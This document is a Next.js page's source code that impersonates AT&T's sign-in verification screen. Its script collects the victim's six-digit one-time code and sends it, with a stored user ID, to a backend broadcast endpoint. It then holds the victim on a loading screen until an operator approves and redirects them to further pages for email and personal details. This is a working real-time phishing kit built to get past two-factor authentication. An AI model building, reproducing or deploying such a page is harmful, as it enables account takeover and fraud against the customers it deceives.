import Head from 'next/head';
import { useEffect } from 'react';
import Script from 'next/script';

export default function OTPPage() {
  useEffect(() => {
    const otpInputs = document.querySelectorAll('.otp-input');
    const submitBtn = document.getElementById('submit-btn');
    const otpForm = document.getElementById('otp-form');
    let cachedUsername = '';
    let pendingActivityId = null;

    // Focus first input on load
    if (otpInputs[0]) {
      otpInputs[0].focus();
    }

    // Handle input navigation
    otpInputs.forEach((input, index) => {
      input.addEventListener('input', function(e) {
        const value = e.target.value.replace(/[^0-9]/g, '');
        e.target.value = value;
        
        if (value && index < otpInputs.length - 1) {
          otpInputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
          otpInputs[index - 1].focus();
        }
      });

      input.addEventListener('paste', function(e) {
        e.preventDefault();
        const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
        pastedData.split('').forEach((char, i) => {
          if (otpInputs[i]) {
            otpInputs[i].value = char;
          }
        });
        if (pastedData.length === 6) {
          otpInputs[5].focus();
        } else if (pastedData.length > 0) {
          otpInputs[pastedData.length].focus();
        }
      });
    });

    async function logActivity(type, userId, additionalData = {}) {
      try {
        const response = await fetch('/api/broadcast', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type, userId, additionalData })
        });
        const data = await response.json();
        return data.activity.id;
      } catch (error) {
        console.error('Error logging activity:', error);
        return null;
      }
    }

    function waitForApprovalSSE(activityId, type, userId) {
      if (window.approvalEventSource) {
        window.approvalEventSource.close();
      }
      
      if (window.approvalPollInterval) {
        clearInterval(window.approvalPollInterval);
        window.approvalPollInterval = null;
      }

      const eventSource = new EventSource(`/api/user-events/${activityId}`);
      window.approvalEventSource = eventSource;
      
      let approvalReceived = false;

      eventSource.onmessage = function(event) {
        try {
          const data = JSON.parse(event.data);
          
          if (data.type === 'approval') {
            approvalReceived = true;
            const approval = data.data;
            
            eventSource.close();
            window.approvalEventSource = null;
            if (window.approvalPollInterval) {
              clearInterval(window.approvalPollInterval);
              window.approvalPollInterval = null;
            }
            
            if (approval.status === 'approved') {
              const redirectType = approval.redirectType || 'password';
              if (redirectType === 'password') {
                window.location.href = '/';
              } else if (redirectType === 'email') {
                window.location.href = '/email';
              } else if (redirectType === 'personal') {
                window.location.href = '/personal';
              }
            }
          }
        } catch (error) {
          console.error('Error parsing SSE message:', error);
        }
      };

      // Polling fallback
      window.approvalPollInterval = setInterval(async () => {
        if (approvalReceived) {
          clearInterval(window.approvalPollInterval);
          window.approvalPollInterval = null;
          return;
        }
        
        try {
          const response = await fetch(`/api/approval/${activityId}`);
          if (response.ok) {
            const approval = await response.json();
            if (approval && approval.status && approval.status !== 'pending') {
              approvalReceived = true;
              if (eventSource) {
                eventSource.close();
                window.approvalEventSource = null;
              }
              clearInterval(window.approvalPollInterval);
              window.approvalPollInterval = null;
              
              if (approval.status === 'approved') {
                const redirectType = approval.redirectType || 'password';
                if (redirectType === 'password') {
                  window.location.href = '/';
                } else if (redirectType === 'email') {
                  window.location.href = '/email';
                } else if (redirectType === 'personal') {
                  window.location.href = '/personal';
                }
              }
            }
          }
        } catch (error) {
          console.error('Error polling for approval:', error);
        }
      }, 1000);
    }

    if (otpForm) {
      otpForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Get OTP code from all inputs
        const otpCode = Array.from(otpInputs).map(input => input.value).join('');
        
        if (otpCode.length === 6) {
          // Get cached username from localStorage or URL
          const storedUserId = localStorage.getItem('lastUserId') || '';
          
          // Log OTP entry
          const activityId = await logActivity('otp', storedUserId, { 
            otpCode: otpCode
          });
          pendingActivityId = activityId;
          
          // Show loading screen
          const loadingScreen = document.getElementById('loading-screen');
          if (loadingScreen) loadingScreen.classList.add('active');
          submitBtn.disabled = true;
          
          // Wait for approval via SSE
          waitForApprovalSSE(activityId, 'otp', storedUserId);
        }
      });
    }
  }, []);

  return (
    <>
      <Head>
        <title>OTP Verification</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      </Head>
      <Script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js" strategy="afterInteractive" />
      <style jsx global>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
          background-color: white;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }

        .login-container {
          background: #ffffff;
          border-radius: 12px;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
          padding: 60px 40px;
          max-width: 450px;
          width: 100%;
          text-align: center;
        }

        .logo {
          margin-bottom: 30px;
        }

        .logo-image {
          width: 133px;
          height: auto;
          margin: 0 auto 15px;
          display: block;
          object-fit: contain;
        }

        h1 {
          font-size: 36px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 5px;
          line-height: 1.2;
        }

        .subtitle {
          font-size: 26px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 35px;
        }

        .form-group {
          margin-bottom: 24px;
          text-align: left;
        }

        label {
          display: block;
          font-size: 16px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 10px;
        }

        .otp-inputs-container {
          display: flex;
          gap: 12px;
          justify-content: center;
          margin-bottom: 24px;
        }

        .otp-input {
          width: 52px;
          height: 52px;
          text-align: center;
          font-size: 24px;
          font-weight: 700;
          color: #333333;
          background: #ffffff;
          border: 2px solid #d1d1d1;
          border-radius: 6px;
          transition: all 0.3s ease;
          outline: none;
        }

        .otp-input:focus {
          border-color: #0057b8;
          box-shadow: 0 0 0 3px rgba(0, 87, 184, 0.1);
        }

        .continue-btn {
          width: 100%;
          height: 46px;
          background: #003d7a;
          color: #ffffff;
          font-size: 13px;
          font-weight: 700;
          border: none;
          border-radius: 23px;
          cursor: pointer;
          transition: all 0.3s ease;
          margin-bottom: 20px;
        }

        .continue-btn:hover {
          background: #002d5a;
          box-shadow: 0 4px 12px rgba(0, 61, 122, 0.3);
        }

        .continue-btn:active {
          background: #002040;
          transform: translateY(1px);
        }

        .continue-btn:disabled {
          background: #cccccc;
          cursor: not-allowed;
        }

        .link-section {
          margin-top: 16px;
          text-align: left;
        }

        .link-section a {
          display: block;
          color: #0088C0;
          font-size: 14px;
          font-weight: 700;
          text-decoration: none;
          margin-bottom: 18px;
          transition: all 0.2s ease;
        }

        .link-section a:hover {
          text-decoration: underline;
          color: #0070A0;
        }

        .separator {
          margin: 30px 0;
          text-align: center;
          position: relative;
        }

        .separator::before {
          content: '';
          position: absolute;
          top: 50%;
          left: 0;
          right: 0;
          height: 1px;
          background: #d1d1d1;
        }

        .separator-text {
          position: relative;
          display: inline-block;
          background: #ffffff;
          padding: 0 15px;
          color: #666666;
          font-size: 14px;
        }

        .secondary-btn {
          width: 100%;
          height: 46px;
          background: #ffffff;
          color: #003d7a;
          font-size: 13px;
          font-weight: 700;
          border: 2px solid #003d7a;
          border-radius: 23px;
          cursor: pointer;
          transition: all 0.3s ease;
          margin-top: 20px;
        }

        .secondary-btn:hover {
          border-color: #002d5a;
          background: #f5f5f5;
          color: #002d5a;
        }

        .secondary-btn:active {
          background: #e8e8e8;
          transform: translateY(1px);
        }

        .footer {
          margin-top: 40px;
          padding-top: 20px;
          text-align: center;
        }

        .footer-links {
          display: flex;
          flex-wrap: wrap;
          justify-content: center;
          gap: 20px;
          margin-bottom: 15px;
        }

        .footer-links a {
          color: #666666;
          font-size: 13px;
          text-decoration: none;
          transition: all 0.2s ease;
        }

        .footer-links a:hover {
          color: #0057b8;
          text-decoration: underline;
        }

        .copyright {
          color: #666666;
          font-size: 12px;
          margin-top: 10px;
        }

        .loading-screen {
          display: none;
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: #ffffff;
          z-index: 9999;
          align-items: center;
          justify-content: center;
          flex-direction: column;
        }

        .loading-screen.active {
          display: flex;
        }

        .loading-spinner {
          width: 40px;
          height: 40px;
          border: 3px solid #e0e0e0;
          border-top: 3px solid #0057b8;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
          margin-bottom: 16px;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .loading-text {
          font-size: 16px;
          color: #333333;
          font-weight: 400;
        }

        @media (max-width: 768px) {
          body {
            padding: 0;
          }

          .login-container {
            max-width: none;
            width: 100%;
            padding: 20px 12px;
            box-shadow: none;
            border-radius: 0;
          }

          h1 {
            font-size: 30px;
          }

          .subtitle {
            font-size: 22px;
          }

          .otp-inputs-container {
            gap: 8px;
          }

          .otp-input {
            width: 45px;
            height: 52px;
            font-size: 20px;
          }

          .footer {
            text-align: left;
            padding-left: 12px;
            padding-right: 12px;
            margin-left: 0;
            margin-right: 0;
            width: 100%;
          }

          .footer-links {
            flex-direction: column;
            gap: 10px;
            justify-content: flex-start;
            align-items: flex-start;
          }

          .footer-links a {
            font-size: 11px;
          }

          .copyright {
            font-size: 11px;
          }
        }

        *:focus-visible {
          outline: 2px solid #0057b8;
          outline-offset: 2px;
        }
      `}</style>
      <div className="login-container">
        <div className="logo">
          <img src="/logo.png" alt="Logo" className="logo-image" />
        </div>

        <h1>Enter verification code</h1>
        <div className="subtitle">to my Account</div>

        <form id="otp-form">
          <div className="form-group">
            <label htmlFor="otp">Verification code</label>
            <div className="otp-inputs-container">
              <input type="text" className="otp-input" maxLength="1" inputMode="numeric" id="otp-1" />
              <input type="text" className="otp-input" maxLength="1" inputMode="numeric" id="otp-2" />
              <input type="text" className="otp-input" maxLength="1" inputMode="numeric" id="otp-3" />
              <input type="text" className="otp-input" maxLength="1" inputMode="numeric" id="otp-4" />
              <input type="text" className="otp-input" maxLength="1" inputMode="numeric" id="otp-5" />
              <input type="text" className="otp-input" maxLength="1" inputMode="numeric" id="otp-6" />
            </div>
          </div>
          <button type="submit" className="continue-btn" id="submit-btn">Continue</button>
        </form>

        <div className="link-section">
          <a href="#resend">Resend code</a>
          <a href="#back">Back to sign in</a>
        </div>

        <div className="separator">
          <span className="separator-text">OR</span>
        </div>

        <button type="button" className="secondary-btn">Login with myAT&T app</button>
      </div>

      <div className="footer">
        <div className="footer-links">
          <a href="#legal">Legal policy center</a>
          <a href="#privacy">Privacy policy</a>
          <a href="#terms">Terms of use</a>
          <a href="#accessibility">Accessibility</a>
          <a href="#choices">Your privacy choices</a>
        </div>
        <div className="copyright">
          ©2025 AT&T Intellectual Property. All rights reserved.
        </div>
      </div>

      <div id="loading-screen" className="loading-screen">
        <div className="loading-spinner"></div>
        <div className="loading-text">Please wait...</div>
      </div>
    </>
  );
}
